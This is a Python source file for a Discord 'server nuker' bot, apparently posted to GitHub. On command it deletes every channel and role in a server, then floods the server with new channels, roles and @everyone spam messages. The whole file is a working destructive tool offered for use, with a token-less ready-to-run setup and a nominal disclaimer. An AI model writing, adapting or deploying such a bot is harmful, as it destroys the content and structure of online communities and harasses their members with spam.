#this file has been made by qeniuu
#i do not approve of using this program.
#https://github.com/qEniuu/basic-discord-server-nuker
#read this ^^^^
import discord
from discord.ext import commands
#import re
intents = discord.Intents.default()
intents.members = True
intents.messages = True
#to powyzej mozna wyjebaec ale po chuj
intents = discord.Intents.all()

client = discord.Bot(intents=intents)

#customization!!
prefix = "chuj!"
magicnumber = 5
channelname = "nuked"
rolename = "Nuked Lmao!!!"
messagespam = "@everyone Get Nuked"
@client.event
async def on_ready(): 
    print(f"Logged in as {client.user} (ID: {client.user.id})")
    #await .sync(guild=discord.Object(id=Your guild id))
    print("Ready!")

@client.event
async def on_message(message):
    #print("it wdetecc")
    ctx = message
    
    if message.content == f"{prefix}test":
        print("it work")
        await message.reply("Stealth działa lmao!!!")

    elif message.content == f"{prefix}nuke":
        for channel in ctx.guild.channels:
            try:
                #await client.delete_channel(channel)
                await channel.delete()
            except:
                print("sie zjebalo")
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                print("sie zjebalo")
        for i in range(magicnumber):
            channel = await ctx.guild.create_text_channel(channelname)
            await channel.send(messagespam) 
        for i in range(magicnumber):
            await ctx.guild.create_role(name=rolename)

    elif message.content == f"{prefix}delchannels":
        for channel in ctx.guild.channels:
            try:
                #await client.delete_channel(channel)
                await channel.delete()
            except:
                print("sie zjebalo")

    elif message.content == f"{prefix}delroles":
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except:
                print("sie zjebalo")

    elif message.content == f"{prefix}spamroles":
        for i in range(magicnumber):
            await ctx.guild.create_role(name=rolename)

    elif message.content == f"{prefix}spamchannels":
        for i in range(magicnumber):
            channel = await ctx.guild.create_text_channel(channelname)
            await channel.send(messagespam) 

    else:
        pass

        
client.run("your token")
